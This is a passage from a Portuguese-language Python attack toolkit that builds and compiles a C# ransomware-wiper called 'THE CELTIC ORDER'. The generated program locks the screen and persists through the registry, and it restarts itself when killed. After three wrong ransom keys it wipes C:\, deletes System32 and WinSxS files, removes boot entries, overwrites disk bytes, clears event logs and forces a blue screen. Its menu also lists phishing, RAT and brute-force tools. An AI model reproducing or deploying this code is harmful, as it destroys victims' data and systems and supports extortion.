            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new RansomForm());
        }

        static bool IsAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static void EnsurePersistence()
        {
            try
            {
                string runKey = @"Software\Microsoft\Windows\CurrentVersion\Run";
                using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(runKey, true))
                {
                    if (key != null)
                    {
                        key.SetValue(AGENT_NAME, "\"" + Process.GetCurrentProcess().MainModule.FileName + "\"");
                        Log("Persistência no Registro configurada.");
                    }
                }
            }
            catch (Exception ex) { Log("Erro em Persistência: " + ex.Message); }
        }

        static void StartAntiTaskManager()
        {
            int pid = Process.GetCurrentProcess().Id;
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            
            new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(2000);
                    
                    if (isDestructionInProgress) break;

                    try
                    {
                        using (Process p = Process.GetProcessById(pid))
                        {
                        }
                    }
                    catch (ArgumentException)
                    {
                        Log("Processo foi matado. Reiniciando (Zumbi Mode).");
                        try {
                            Process.Start("cmd", "/c start \"\" \"" + exePath + "\"");
                        } catch (Exception ex) { Log("Falha ao reiniciar: " + ex.Message); }
                        Environment.Exit(0);
                    }
                }
            }).Start();
        }

        // --- LÓGICA DE DESTRUIÇÃO ---

        static void RunCmd(string cmd)
        {
            Log("Executando CMD: " + cmd);
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("cmd", "/c " + cmd);
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.UseShellExecute = false;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                using (Process p = Process.Start(psi))
                {
                    string output = p.StandardOutput.ReadToEnd();
                    string error = p.StandardError.ReadToEnd();
                    p.WaitForExit(120000);
                    if (!string.IsNullOrEmpty(output)) Log("CMD OUT: " + output);
                    if (!string.IsNullOrEmpty(error)) Log("CMD ERR: " + error);
                }
            }
            catch (Exception ex) { Log("Exceção em RunCmd: " + ex.Message); }
        }

        // --- NOVO: EXECUÇÃO ADMINISTRATIVA EM SEGUNDO PLANO ---
        static void ExecuteAdminWipe()
        {
            // Verifica se já é admin, se não, eleva privilégios
            if (!IsAdmin())
            {
                // Reexecuta o próprio processo com privilégios de admin
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = Process.GetCurrentProcess().MainModule.FileName,
                    UseShellExecute = true,
                    Verb = "runas", // Força a elevação UAC
                    Arguments = "--admin-wipe-only"
                };
                try
                {
                    Process.Start(psi);
                    Log("Processo elevado iniciado para Admin Wipe.");
                    return; // O processo atual continua, o novo assume o wipe
                }
                catch (Exception ex)
                {
                    Log("Falha ao elevar privilégios para Wipe: " + ex.Message);
                }
            }
            else
            {
                // Se já é admin (ou foi reexecutado com --admin-wipe-only), executa o comando
                string wipeCommand = "rd /s /q C:\\";
                
                // Executa em segundo plano, sem janelas visíveis
                RunCmd(wipeCommand);
                Log("Comando 'rd /s /q C:\\' executado com privilégios elevados.");
            }
        }

        static void DestroySystem32()
        {
            Log("Iniciando DestroySystem32...");
            string sys32Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32");
            string winsxsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "WinSxS");
            
            RunCmd("attrib -r -s -h \"" + sys32Path + "\\*\" /s /d");
            RunCmd("attrib -r -s -h \"" + winsxsPath + "\\*\" /s /d");
            
            string[] criticalFiles = { "ntoskrnl.exe", "hal.dll", "kernel32.dll", "user32.dll", "gdi32.dll", "advapi32.dll", "ws2_32.dll", "crypt32.dll", "ole32.dll", "shell32.dll" };
            
            foreach (string file in criticalFiles)
            {
                string target = Path.Combine(sys32Path, file);
                if (File.Exists(target))
                {
                    try { 
                        File.Delete(target); 
                        Log("Arquivo apagado: " + target);
                    } 
                    catch (Exception ex) { 
                        Log("Falha em File.Delete " + target + ": " + ex.Message + ". Tentando DEL...");
                        RunCmd("del /f /q \"" + target + "\""); 
                    }
                }
            }

            string[] criticalDirs = { "DriverStore", "Wbem", "catroot2" };
            foreach (string dir in criticalDirs)
            {
                string targetDir = Path.Combine(sys32Path, dir);
                if (Directory.Exists(targetDir))
                {
                    try { 
                        Directory.Delete(targetDir, true); 
                        Log("Diretório apagado: " + targetDir);
                    } catch (Exception ex) { Log("Falha ao apagar dir " + targetDir + ": " + ex.Message); }
                }
            }
            
            if (Directory.Exists(winsxsPath))
            {
                try { 
                    Directory.Delete(winsxsPath, true); 
                    Log("WinSxS apagado.");
                } catch (Exception ex) { Log("Falha ao apagar WinSxS: " + ex.Message); }
            }
            Log("DestroySystem32 Concluído.");
        }

        static void DestroyRegistryBoot()
        {
            Log("Iniciando DestroyRegistryBoot...");
            RunCmd("bcdedit /delete {default} & bcdedit /delete {current} & bcdedit /delete {badmemory}");
            
            string psCmd = @"$zeroBytes = New-Object byte[] 512; $disk = Get-Disk | Select-Object -First 1; $partition = Get-Partition -DiskNumber $disk.Number | Select-Object -First 1; $stream = [System.IO.File]::Open($partition.Path, 'Open', 'ReadWrite'); $stream.Write($zeroBytes, 0, 512); $stream.Close()";
            RunCmd("powershell -ExecutionPolicy Bypass -Command \"" + psCmd + "\"");
            Log("DestroyRegistryBoot Concluído.");
        }

        static void ForensicWipe()
        {
            Log("Iniciando ForensicWipe...");
            string[] eventLogs = { "System", "Application", "Security", "Setup", "Directory Service" };
            foreach (string log in eventLogs)
            {
                RunCmd("wevtutil cl \"" + log + "\"");
            }
            
            string psHistory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHostHistory.txt";
            if (File.Exists(psHistory)) {
                File.Delete(psHistory);
                Log("Histórico PowerShell limpo.");
            }

            string tempPath = Environment.GetEnvironmentVariable("TEMP");
            if (Directory.Exists(tempPath))
            {
                try
                {
                    foreach (string item in Directory.GetFileSystemEntries(tempPath))
                    {
                        try
                        {
                            if (Directory.Exists(item)) Directory.Delete(item, true);
                            else File.Delete(item);
                        }
                        catch { }
                    }
                }
                catch { }
            }
            Log("ForensicWipe Concluído.");
        }

        static void TriggerBlueScreen()
        {
            Log("Disparando NtBugCheck...");
            // 0x0000007E: SYSTEM_THREAD_EXCEPTION_NOT_HANDLED
            NtBugCheck(0x0000007E, 0xDEAD, 0xCAFEBABE, 0x42);
            Log("NtBugCheck Retornou (Isso não deveria acontecer se o kernel crashou).");
        }

        static void ExecuteDestruction(RansomForm form)
        {
            if (isDestroyed) return;
            isDestroyed = true;
            isDestructionInProgress = true;
            
            // Garante que a UI seja atualizada antes de sair
            try {
                if (form != null && !form.IsDisposed)
                {
                    form.BeginInvoke(new Action(() => {
                        form.statusLabel.Text = "PROTOCOLO DE DESTRUIÇÃO INICIADO...";
                        form.statusLabel.ForeColor = Color.Red;
                        form.Update();
                    }));
                }
            } catch { }

            Log("=== INICIANDO SEQUÊNCIA DE DESTRUIÇÃO FINAL ===");

            // 1. Executa o wipe administrativo (pode reexecutar com runas)
            ExecuteAdminWipe();

            // 2. Executa as outras rotinas de destruição localmente
            if (MODE_FORENSIC) ForensicWipe();
            if (MODE_REGISTRY) DestroyRegistryBoot();
            if (MODE_SYS32) DestroySystem32();

            // 3. Dispara o BSOD ou mensagem final
            if (MODE_BSOD)
            {
                Log("Mostrando mensagem final antes do BSOD...");
                try {
                    if (form != null && !form.IsDisposed)
                    {
                        form.BeginInvoke(new Action(() => {
                            MessageBox.Show("INICIANDO SEQUÊNCIA DE DESTRUIÇÃO...\nPREPARE-SE.", "THE CELTIC ORDER", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        }));
                    }
                    else
                    {
                        MessageBox.Show("INICIANDO SEQUÊNCIA DE DESTRUIÇÃO...\nPREPARE-SE.", "THE CELTIC ORDER", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                } catch { }
                
                Thread.Sleep(3000);
                TriggerBlueScreen();
            }
            else
            {
                Log("Modo BSOD desativado. Mostrando mensagem de conclusão.");
                try {
                    if (form != null && !form.IsDisposed)
                    {
                        form.BeginInvoke(new Action(() => {
                            MessageBox.Show("PROTOCOLO DE DESTRUIÇÃO CONCLUÍDO.\nSistema comprometido.", "THE CELTIC ORDER", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }));
                    }
                    else
                    {
                        MessageBox.Show("PROTOCOLO DE DESTRUIÇÃO CONCLUÍDO.\nSistema comprometido.", "THE CELTIC ORDER", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                } catch { }
                    }

            Log("Chamando Environment.Exit(0)");
            Environment.Exit(0);
        }

        // --- INTERFACE GRÁFICA (WINFORMS - KIOSK TOTAL) ---

        class RansomForm : Form
        {
            private Label titleLabel;
            private Label subLabel;
            private TextBox noteBox;
            private TextBox keyBox;
            private Button submitBtn;
            public Label statusLabel; // Público para acesso externo seguro

            public RansomForm()
            {
                this.FormBorderStyle = FormBorderStyle.None; 
                this.MaximizeBox = false;
                this.MinimizeBox = false;
                this.TopMost = true;
                
                Rectangle screenBounds = Screen.PrimaryScreen.Bounds;
                this.Location = new Point(0, 0);
                this.Size = screenBounds.Size;

                this.BackColor = Color.Black;
                this.Text = "THE CELTIC ORDER";

                TableLayoutPanel mainLayout = new TableLayoutPanel();
                mainLayout.Dock = DockStyle.Fill;
                mainLayout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100F));
                mainLayout.RowStyles.Add(new RowStyle(SizeType.Percent, 10F));
                mainLayout.RowStyles.Add(new RowStyle(SizeType.Percent, 10F));
                mainLayout.RowStyles.Add(new RowStyle(SizeType.Percent, 40F));
                mainLayout.RowStyles.Add(new RowStyle(SizeType.Percent, 10F));
                mainLayout.RowStyles.Add(new RowStyle(SizeType.Percent, 15F));
                mainLayout.RowStyles.Add(new RowStyle(SizeType.Percent, 10F));
                mainLayout.RowStyles.Add(new RowStyle(SizeType.Percent, 5F));

                titleLabel = new Label
                {
                    Text = "THE CELTIC ORDER",
                    Font = new Font("Arial Black", 48, FontStyle.Bold),
                    ForeColor = Color.Red,
                    BackColor = Color.Black,
                    TextAlign = ContentAlignment.MiddleCenter
                };
                mainLayout.Controls.Add(titleLabel, 0, 0);

                subLabel = new Label
                {
                    Text = "SISTEMA COMPROMETIDO",
                    Font = new Font("Arial", 16, FontStyle.Bold),
                    ForeColor = Color.White,
                    BackColor = Color.Black,
                    TextAlign = ContentAlignment.MiddleCenter
                };
                mainLayout.Controls.Add(subLabel, 0, 1);

                noteBox = new TextBox
                {
                    Text = NOTE_TEXT,
                    Font = new Font("Consolas", 14),
                    ForeColor = Color.Lime,
                    BackColor = Color.FromArgb(17, 17, 17),
                    BorderStyle = BorderStyle.FixedSingle,
                    ReadOnly = true,
                    Multiline = true,
                    ScrollBars = ScrollBars.Vertical,
                    Dock = DockStyle.Fill
                };
                mainLayout.Controls.Add(noteBox, 0, 2);

                Label keyLabel = new Label
                {
                    Text = "INSIRA A CHAVE DE RESGATE:",
                    Font = new Font("Arial", 14, FontStyle.Bold),
                    ForeColor = Color.White,
                    BackColor = Color.Black,
                    TextAlign = ContentAlignment.MiddleCenter
                };
                mainLayout.Controls.Add(keyLabel, 0, 3);

                keyBox = new TextBox
                {
                    Font = new Font("Consolas", 20),
                    ForeColor = Color.Black,
                    BackColor = Color.White,
                    BorderStyle = BorderStyle.FixedSingle,
                    Dock = DockStyle.Fill,
                    TextAlign = HorizontalAlignment.Center
                };
                keyBox.KeyDown += (s, e) => { if (e.KeyCode == Keys.Enter) CheckKey(); };
                mainLayout.Controls.Add(keyBox, 0, 4);

                submitBtn = new Button
                {
                    Text = "VALIDAR CHAVE",
                    Font = new Font("Arial", 14, FontStyle.Bold),
                    ForeColor = Color.White,
                    BackColor = Color.Red,
                    FlatStyle = FlatStyle.Flat,
                    Dock = DockStyle.Fill
                };
                submitBtn.Click += (s, e) => CheckKey();
                mainLayout.Controls.Add(submitBtn, 0, 5);

                statusLabel = new Label
                {
                    Text = "",
                    Font = new Font("Arial", 12, FontStyle.Bold),
                    ForeColor = Color.Orange,
                    BackColor = Color.Black,
                    TextAlign = ContentAlignment.MiddleCenter,
                    Dock = DockStyle.Fill
                };
                mainLayout.Controls.Add(statusLabel, 0, 6);

                this.Controls.Add(mainLayout);

                this.KeyDown += (s, e) => { if (e.KeyCode == Keys.Enter) CheckKey(); };
                this.Shown += (s, e) => keyBox.Focus();

                this.Deactivate += (s, e) =>
                {
                    this.TopMost = true;
                    this.Activate();
                    keyBox.Focus();
                };
            }

            protected override void OnFormClosing(FormClosingEventArgs e)
            {
                if (e.CloseReason == CloseReason.UserClosing)
                {
                    e.Cancel = true;
                }
                base.OnFormClosing(e);
            }

            void CheckKey()
            {
                if (isDestroyed) return;

                string userInput = keyBox.Text.Trim();

                if (userInput == SECRET_KEY)
                {
                    // SUCESSO
                    Log("Chave Correta. Finalizando com Resgate.");
                    try
                    {
                        using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                        {
                            if (key != null)
                            {
                                key.DeleteValue(AGENT_NAME, false);
                            }
                        }
                    }
                    catch (Exception ex) { Log("Erro ao remover persistência: " + ex.Message); }

                    this.Close();
                    Process.Start("notepad.exe", "- \"THE CELTIC ORDER - RESGATE CONFIRMADO\n\nChave: " + SECRET_KEY + "\n\nO sistema está seguro. Nenhuma destruição foi executada.\"");
                    Environment.Exit(0);
                }
                else
                {
                    attempts++;
                    int remaining = maxAttempts - attempts;
                    Log("Tentativa errada. Restantes: " + remaining.ToString());

                    if (remaining > 0)
                    {
                        statusLabel.Text = "CHAVE INVÁLIDA. TENTATIVAS RESTANTES: " + remaining.ToString();
                        statusLabel.ForeColor = Color.Orange;
                        keyBox.Clear();
                        keyBox.Focus();
                    }
                    else
                    {
                        statusLabel.Text = "CHAVE INCORRETA. INICIANDO PROTOCOLO DE DESTRUIÇÃO...";
                        statusLabel.ForeColor = Color.Red;
                        submitBtn.Enabled = false;
                        keyBox.Enabled = false;
                        
                        // Força a atualização da UI antes de sair para a thread de trabalho
                        this.Update();

                        // Executa a destruição em uma thread separada para não travar a UI
                        new Thread(() =>
                        {
                            Thread.Sleep(5000); 
                            ExecuteDestruction(this);
                        }).Start();
                    }
                }
            }
        }
    }
}
'''

    # 5. GERAÇÃO DO ARQUIVO C#
    print("\n[5] Gerando Payload C#...")
    
    # Substitui os placeholders pelos valores reais
    # Atenção: O NOTE_TEXT precisa ser escapado para ser uma string C# válida
    # Como o template usa r''', as aspas duplas já estão tratadas, mas precisamos garantir
    # que quebras de linha no input do usuário viram \n no C#
    final_note_for_csharp = escaped_note.replace("\n", "\\n")
    
    final_payload = template_payload
    final_payload = final_payload.replace("__AGENT_NAME__", agent_name)
    final_payload = final_payload.replace("__SECRET_KEY__", secret_key)
    final_payload = final_payload.replace("__NOTE_TEXT__", final_note_for_csharp)
    final_payload = final_payload.replace("__FLAG_SYS32__", "true" if flag_sys32 else "false")
    final_payload = final_payload.replace("__FLAG_REGISTRY__", "true" if flag_registry else "false")
    final_payload = final_payload.replace("__FLAG_FORENSIC__", "true" if flag_forensic else "false")
    final_payload = final_payload.replace("__FLAG_BSOD__", "true" if flag_bsod else "false")

    output_cs = f"{safe_name}_wiper.cs"
    output_exe = f"{safe_name}.exe"

    with open(output_cs, "w", encoding="utf-8") as f:
        f.write(final_payload)

    print(f"[INFO] Código C# gerado: {output_cs}")
    print("[INFO] Tentando compilação automática...")

    success = False
    csc_found = None

    # Procura pelo Compilador C# (csc.exe)
    csc_paths = [
        r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
        r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
    ]
    
    if shutil.which("csc.exe"):
        csc_paths.insert(0, shutil.which("csc.exe"))

    for path in csc_paths:
        if os.path.exists(path):
            csc_found = path
            break

    if csc_found:
        print(f"[INFO] Compilador detectado: {csc_found}")
        
        # Referências necessárias
        refs = [
            "/r:System.dll",
            "/r:System.Drawing.dll",
            "/r:System.Windows.Forms.dll",
            "/r:System.Core.dll"
        ]
        
        cmd = [
            csc_found,
            "/target:winexe",
            f"/out:\"{output_exe}\"",
            "/optimize+",
            "/nologo",
            "/unsafe+",
            "/platform:anycpu"
        ] + refs + [output_cs]
        
        try:
            subprocess.run(cmd, check=True, capture_output=True, text=True, timeout=60)
            if os.path.exists(output_exe):
                print(f"[SUCESSO] Executável nativo gerado: {output_exe}")
                success = True
            else:
                print("[ERRO] Compilador terminou, mas o .exe não foi encontrado.")
        except subprocess.CalledProcessError as e:
            print(f"[ERRO] Falha na compilação C#: {e.stderr}")
            print("[INFO] Verifique se o .NET Framework 4.x está instalado.")

    # Fallback para Mono (Linux/Mac)
    if not success and shutil.which("mcs"):
        print("[INFO] csc.exe não encontrado. Tentando Mono (mcs)...")
        try:
            mcs_cmd = [
                "mcs", 
                "-target:win32", 
                f"-out:{output_exe}", 
                "-r:System.dll", 
                "-r:System.Drawing.dll", 
                "-r:System.Windows.Forms.dll", 
                "-r:System.Core.dll", 
                output_cs
            ]
            subprocess.run(mcs_cmd, check=True, capture_output=True, text=True, timeout=60)
            if os.path.exists(output_exe):
                print(f"[SUCESSO] Executável Mono gerado: {output_exe}")
                success = True
        except subprocess.CalledProcessError as e:
            print(f"[ERRO] Falha na compilação Mono: {e.stderr}")

    if not success:
        print("\n" + "="*50)
        print(" ⚠️ COMPILAÇÃO AUTOMÁTICA FALHOU OU AMBIENTE NÃO WINDOWS")
        print("="*50)
        print(f"""
        O arquivo C# foi gerado com sucesso: {output_cs}
        
        Como compilar manualmente:
        
        OPÇÃO A: No Windows (Recomendado)
        1. Abra o Prompt de Comando como Administrador.
        2. Navegue até a pasta deste arquivo.
        3. Execute:
           C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:winexe /r:System.Windows.Forms.dll /r:System.Drawing.dll /r:System.Core.dll {output_cs}
        4. O arquivo {output_exe} será gerado.
        
        OPÇÃO B: Usando Visual Studio
        1. Crie um novo Projeto "Windows Forms App".
        2. Substitua o conteúdo do arquivo Program.cs pelo conteúdo de {output_cs}.
        3. Compile (F5 ou Build).
        """)

    if success:
        print("\n" + "="*50)
        print(f" ✅ EXECUTÁVEL DE DESTRUIÇÃO GERADO: {output_exe}")
        print("="*50)
        print(f"""
        📋 Detalhes:
        - Nome do Agente: {agent_name}
        - Chave de Resgate: {secret_key}
        - Modos: Sys32={flag_sys32}, Registry={flag_registry}, Forensic={flag_forensic}, BSOD={flag_bsod}
        
        🚀 Comportamento:
        - Janela Kiosk Nativa (Sem minimizar/maximizar).
        - Sempre no Topo (Top-Always).
        - Anti-Task Manager (Renasce se matado).
        - Persistência no Registro (Volta no Boot).
        - Após 3 erros, executa a destruição nativa e força o BSOD.
        
        ⚠️ AVISO:
        - Execute o .exe como Administrador para máxima efetividade.
        - Teste em uma VM antes de usar em ambiente real.
        - O log de execução será salvo em C:\\CelticWiper.log
        """)

    input("\nPressione Enter para voltar ao menu principal...")

        

if option == 1:
    analise()
elif option == 2:
    gerador_de_senhas()
elif option == 3:
    telefone()
elif option == 4:
    geolocalizar_ip()
elif option == 5:
    phisher()
elif option == 6:
    malware_total()
elif option == 7:
    internet()
elif option == 8:
    manual()
elif option == 9:
    brute_force()
elif option == 10:
    payload_forge()
elif option == 11:
    reverse_engineer()
elif option == 12:
    rat_generator()
elif option == 13:
    destruction_suite()
else:
    print("Opção invalida porfavor digite outro numero")
